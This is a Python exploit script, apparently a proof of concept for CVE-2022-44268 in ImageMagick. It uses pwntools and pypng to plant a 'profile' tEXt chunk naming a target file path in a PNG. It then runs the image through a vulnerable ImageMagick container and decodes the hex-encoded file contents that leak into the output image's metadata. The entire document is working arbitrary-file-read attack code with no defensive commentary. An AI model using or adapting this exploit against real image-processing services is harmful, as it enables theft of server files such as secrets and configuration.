#! /usr/bin/env python3

from pwn import *
import png
import sys
import os
import re

TEXT_CHUNK_FLAG = b'tEXt'


def generate_chunk_tuple(type_flag, content):
    return tuple([type_flag, content])


def generate_text_chunk_tuple(str_info):
    type_flag = TEXT_CHUNK_FLAG
    return generate_chunk_tuple(type_flag, bytes(str_info, 'utf-8'))


def insert_text_chunk(target, text, index=1):
    if index < 0:
        raise Exception('The index value {} less than 0!'.format(index))

    reader = png.Reader(filename=target)
    chunks = reader.chunks()
    chunk_list = list(chunks)
    print(chunk_list[0])
    print(chunk_list[1])
    print(chunk_list[2])
    chunk_item = generate_text_chunk_tuple(text)
    chunk_list.insert(index, chunk_item)
    
    with open('mod.png', 'wb') as dst_file:
        png.write_chunks(dst_file, chunk_list)


def _insert_text_chunk_to_png_test(src, desired):
    insert_text_chunk(src, f'profile\x00{desired}')


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: ./e.py <png filename> <desired file>")
        exit(0)
    _insert_text_chunk_to_png_test(sys.argv[1], sys.argv[2])
    os.system("docker run -it -v $(pwd):/w cve-2022-44268 /w/mod.png -resize 100x100 /w/extract.png")
    os.system("identify -verbose ./extract.png > info.txt")
    with open('info.txt', 'r') as info:
        stuff = info.read()
        match = re.search(r"Raw profile type:\s+(.*?)\s+signature:", stuff, re.S)
        if match:
            extracted_section = match.group(1).split('\n')
            file_contents = []
            for line in extracted_section[1:]:
                file_contents.append(bytes.fromhex(line).decode('utf-8'))
            file_name = sys.argv[2].split('/')[-1]
            with open(file_name, 'w') as f:
                f.writelines(file_contents)
        else:
            print("No match found.")
        
    os.remove('info.txt')
    os.remove('extract.png')
    os.remove('mod.png')
    # stuff = os.system("identify -verbose ./extract.png ")
